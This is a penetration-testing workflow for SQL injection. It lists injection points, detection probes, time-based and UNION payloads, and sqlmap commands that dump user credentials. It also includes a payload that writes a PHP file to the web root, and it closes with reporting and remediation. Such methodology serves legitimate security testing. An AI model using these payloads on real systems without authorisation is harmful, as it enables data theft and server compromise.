# Scenario: SQL Injection Testing Workflow

## Objective
Systematically identify, confirm, and exploit SQL injection vulnerabilities in web application parameters.

---

## Phase 1: Identify Injectable Parameters

### Step 1: Map all input points
Crawl the target and list every parameter that could interact with a database:
```
- Search fields (?q=, ?search=, ?keyword=)
- Login forms (username, password)
- Filters and sorting (?sort=, ?order=, ?category=)
- Pagination (?page=, ?limit=, ?offset=)
- API parameters (?id=, ?user_id=, ?item=)
- Headers (X-Forwarded-For, Referer, User-Agent: less common)
- Cookies (session values used in DB queries)
```

### Step 2: Baseline each parameter
Send a normal value and record the response (status code, length, content).

---

## Phase 2: Detection

### Step 3: Error-based probing
For each parameter, inject:
```
Original value: 1
Test 1: 1'         → SQL error? → potential injection
Test 2: 1''        → Normal response? → confirmed string context
Test 3: 1 OR 1=1   → More results? → numeric context
Test 4: 1 OR 1=2   → Normal results? → confirms boolean difference
Test 5: 1' OR '1'='1  → String context boolean injection
```

**Look for:**
- SQL error messages (syntax error, unclosed quote)
- Different response content or length
- More/fewer results than expected

### Step 4: Time-based blind detection
If no visible difference:
```
MySQL:    1' AND SLEEP(5)-- -
MSSQL:    1'; WAITFOR DELAY '0:0:5'-- -
PostgreSQL: 1'; SELECT pg_sleep(5)-- -
```
If the response takes 5 seconds longer → blind SQLi confirmed.

### Step 5: Identify the database
```
MySQL:    1' AND @@version-- -
MSSQL:    1' AND 1=CONVERT(int,@@version)-- -
PostgreSQL: 1' AND version(): int=1-- -
Oracle:   1' AND 1=(SELECT 1 FROM dual)-- -
```

---

## Phase 3: Exploitation

### Step 6: Column count (for UNION injection)
```
1' ORDER BY 1-- -    → OK
1' ORDER BY 2-- -    → OK
1' ORDER BY 3-- -    → OK
1' ORDER BY 4-- -    → Error → 3 columns
```

### Step 7: Find display columns
```
1' UNION SELECT 'A','B','C'-- -
→ Which position appears in the response?
```

### Step 8: Extract database structure
```sql
-- List databases
1' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata-- -

-- List tables
1' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='target_db'-- -

-- List columns
1' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -
```

### Step 9: Extract data
```sql
1' UNION SELECT username,password,email FROM users-- -
```

### Step 10: Automated exploitation with sqlmap
```bash
# Basic detection
sqlmap -u "https://target.com/page?id=1" --dbs

# From Burp request file
sqlmap -r request.txt --dump --batch

# Specific parameter
sqlmap -u "https://target.com/page?id=1&name=test" -p id --dump
```

---

## Phase 4: Escalation

### Step 11: Attempt write operations
Verify execution permissions with innocuous payload:
```sql
-- Write test file (MySQL + FILE privilege)
1' UNION SELECT '<?php echo "test"; ?>' INTO OUTFILE '/var/www/html/test.php'-- -
```

### Step 12: Document and report
- Record the exact injection point and payload
- Screenshot the extracted data
- Assess impact: auth bypass? data theft? file writing?
- Suggest parameterized queries as remediation

---

## Decision Tree

```
Parameter found
  ├── Add ' → SQL error? → String-context SQLi → UNION extraction
  ├── Add ' → Different result length? → Boolean blind → Character extraction  
  ├── Add SLEEP(5) → Delay? → Time-blind → Character extraction
  ├── No visible change → Try OOB (DNS/HTTP callback)
  └── WAF blocks? → Try bypass (comments, encoding, case variation)
```

## Tools
- `sqlmap`: Automated detection and extraction
- `Burp Suite Repeater`: Manual injection testing
- `Hackvertor` (Burp extension): Encoding/decoding payloads

## References
- `techniques/sql-injection.md`
- `methodology/exploitation-methodology.md`
